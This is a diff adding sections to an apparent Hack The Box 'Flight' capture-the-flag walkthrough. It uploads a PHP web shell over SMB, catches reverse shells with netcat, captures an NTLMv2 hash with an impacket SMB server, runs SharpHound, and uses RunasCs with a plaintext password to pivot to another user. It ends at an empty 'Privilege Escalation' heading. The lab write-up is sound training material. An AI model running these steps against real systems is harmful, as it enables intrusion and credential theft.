@@ -12,6 +12,7 @@
 	7. [Cracking_NTLM_Hash](#Cracking_NTLM_Hash)
 	8. [NetExec_SMB_Share_Enum](#NetExec_SMB_Share_Enum)
 	9. [User_Flag_Captured](#User_Flag_Captured)
+	10. [WebShell_As_SVC_Apache](#WebShell_As_SVC_Apache)
 
 ### `Box-Info`
 ```
@@ -285,3 +286,122 @@ getting file \C.bum\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) 
 └─# cat user.txt           
 5da8288********************
 ```
+##### WebShell_As_SVC_Apache
+```
+# smbclient -U 'c.bum%Tikkycoll_431012284' //10.10.11.187/Web
+smb: \school.flight.htb\> put shell.php 
+putting file shell.php as \school.flight.htb\shell.php (28.1 kb/s) (average 28.1 kb/s)
+smb: \school.flight.htb\> exit
+```
+
+```
+# curl http://school.flight.htb/shell.php
+<!______IT Will Hang Here________!>
+On the netcat side
+# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.11.187] 53840
+SOCKET: Shell has connected! PID: 4780
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\school.flight.htb>
+```
+
+##### Mounting_Share_With_Creds_On_Windows_NetUse
+```
+# impacket-smbserver a . -smb2support -username asdf -password asdf
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.187,53858)
+[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
+[*] Could not authenticate user!
+[*] Closing down connection (10.10.11.187,53858)
+[*] Remaining connections []
+[*] Incoming connection (10.10.11.187,53859)
+[*] AUTHENTICATE_MESSAGE (\asdf,G0)
+[*] User G0\asdf authenticated successfully
+[*] asdf:::aaaaaaaaaaaaaaaa:df17ff36364c5df0168803fdfd8ceff4:0101000000000000800b83546636db01eb46a74b6aa02bd500000000010010004d0076007a00790067005a0071007500030010004d0076007a00790067005a0071007500020010004d0050005a00780053006f006d004a00040010004d0050005a00780053006f006d004a0007000800800b83546636db0106000400020000000800300030000000000000000000000000300000e94e52e16be52276eb100527a5087de7e2ed8a3603e5ae88eadd6ec0257a35060a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:a)
+[*] Disconnecting Share(1:IPC$)
+```
+
+```
+PS C:\xampp\htdocs\school.flight.htb> net use \\10.10.14.5\a /user:asdf asdf
+The command completed successfully.
+PS C:\xampp\htdocs\school.flight.htb> net use
+New connections will be remembered.
+
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+OK                     \\10.10.14.5\a            Microsoft Windows Network
+The command completed successfully.
+```
+
+##### SharpHound_to_Collect_Data
+```
+PS C:\xampp\htdocs\school.flight.htb> copy \\10.10.14.5\a\SharpHound.exe .
+PS C:\xampp\htdocs\school.flight.htb> .\SharpHound.exe
+2024-11-14T06:28:08.6256268-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2024-11-14T06:28:08.7506324-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-11-14T06:28:08.7818814-08:00|INFORMATION|Initializing SharpHound at 6:28 AM on 11/14/2024
+2024-11-14T06:28:08.8912568-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for flight.htb : g0.flight.htb
+2024-11-14T06:28:33.0475051-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-11-14T06:28:33.1568796-08:00|INFORMATION|Beginning LDAP search for flight.htb
+2024-11-14T06:28:33.1881278-08:00|INFORMATION|Producer has finished, closing LDAP channel
+2024-11-14T06:28:33.1881278-08:00|INFORMATION|LDAP channel closed, waiting for consumers
+
+024-11-14T06:29:03.6100165-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
+
+024-11-14T06:29:33.1412516-08:00|INFORMATION|Consumers finished, closing output channel
+2024-11-14T06:29:33.1725032-08:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2024-11-14T06:29:33.3600033-08:00|INFORMATION|Status: 104 objects finished (+104 1.733333)/s -- Using 42 MB RAM
+2024-11-14T06:29:33.3600033-08:00|INFORMATION|Enumeration finished in 00:01:00.2078704
+2024-11-14T06:29:33.4225047-08:00|INFORMATION|Saving cache with stats: 63 ID to type mappings.
+ 63 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2024-11-14T06:29:33.4381294-08:00|INFORMATION|SharpHound Enumeration Completed at 6:29 AM on 11/14/2024! Happy Graphing!
+```
+After reviewing the Bloodhound, There were few interesting things that I can point out but none of those things were helpful in the direction of grabbing the root flag.
+##### Grabbing_CBum_Shell
+```
+PS C:\ProgramData> copy \\10.10.14.5\a\RunasCs.exe .
+Getting RunasCs.exe on the Target
+```
+
+Starting the NetCat Listener
+```
+C:\ProgramData>.\RunasCs.exe c.bum Tikkycoll_431012284 -r 10.10.14.5:4444 cmd
+[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-7a705$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3672 created in background.
+```
+
+On the NetCat Listener Side
+```
+┌──(venv)─(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.11.187] 57241
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+flight\c.bum
+```
+
+### Privilege Escalation
